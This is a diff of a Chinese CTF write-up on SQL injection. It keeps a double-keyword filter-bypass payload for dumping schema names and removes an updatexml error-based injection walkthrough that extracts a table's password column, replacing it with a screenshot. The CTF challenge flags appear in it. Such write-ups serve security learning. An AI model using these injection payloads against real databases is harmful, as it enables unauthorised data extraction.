@@ -36,7 +36,7 @@ Hello 2！
 Your password is 'geek'
 ```
 
-再查看所有数据库
+查看所有数据库
 
 ````sql
 b' ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) #
@@ -96,43 +96,7 @@ Your password is 'flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}'
 
 可以试出是单引号闭合，但是空格被过滤了，所以使用报错注入
 
-```
-b'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#
-```
-
-```
-XPATH syntax error: '~geek~'
-```
-
-找到`geek`数据库，然后又是类似的程序化操作，爆库、爆表、爆字段、爆数据
-
-```sql
-#==爆geek数据库中的表==
-b'or(updatexml(1,concat(0x7e,(select(group_concat(`table_name`,'@'))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
-
-#==回显结果==
-XPATH syntax error: '~H4rDsq1@~'
-
-#==爆列名==
-b'or(updatexml(1,concat(0x7e,(select(group_concat(`column_name`,'@'))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#
-
-#==回显结果==
-XPATH syntax error: '~id@,username@,password@~'
-
-#猜测flag内容在password字段里
-#==爆password数据==
-b'or(updatexml(1,concat(0x7e,(select(left(password,25))from(H4rDsq1)),0x7e),1))#
-
-#==回显结果==
-XPATH syntax error: '~flag{feae3b3c-198d-4bce-9~'
-
-#发现只有一半的flag，所以还需要
-#==爆破==
-b'or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#
-
-#==回显结果==
-XPATH syntax error: '~d-4bce-9c93-76903e057e78}~'
-```
+![image-20210727113650753](image-20210727113650753.png "防止github page build失败")
 
 这题的主要知识点就是利用`updatexml()`和`extractvalue()`函数进行报错注入。使用`concat()`函数，再加上`~`或者`@`等能够引起路径参数报错的字符，将形如`concat(0x7e, 语句, 0x7e)`这样的结果作为参数，就能够得到`XPATH syntax error: '回显结果'`这样的报错信息，实现注入。
 
